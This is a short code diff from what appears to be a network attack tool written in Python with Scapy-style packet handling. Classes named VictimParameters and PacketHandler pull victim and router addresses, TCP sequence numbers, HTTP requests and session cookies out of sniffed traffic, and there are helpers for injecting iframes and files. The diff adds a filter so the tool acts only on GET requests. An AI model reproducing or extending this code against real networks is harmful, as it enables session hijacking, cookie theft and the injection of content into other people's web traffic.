@@ -38,6 +38,7 @@ class VictimParameters:
 		if (self.inject_file is not None):
 			self.file_inject=self.load_injection(self.inject_file)
 			self.file_injected=0
+#		if (self.in_request is not None and self.):
 
 
 	def create_iframe(self,website,id):
@@ -274,6 +275,8 @@ class PacketHandler:
 			acknum=str(int(packet.getlayer(TCP).seq)+size)
 			seqnum=packet.getlayer(TCP).ack
 			request=self.get_request(packet)
+			if ("GET" not in request):
+				return 0
 			cookie=self.search_cookie(request)
 #			print (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
 			return (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
@@ -283,6 +286,7 @@ class PacketHandler:
 		if (self.handler is not None):
 			self.handler(self,interface,pkt)
 		else:
+#			ls(pkt)
 			try:
 				vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie=self.handle_default(pkt)
 			except:
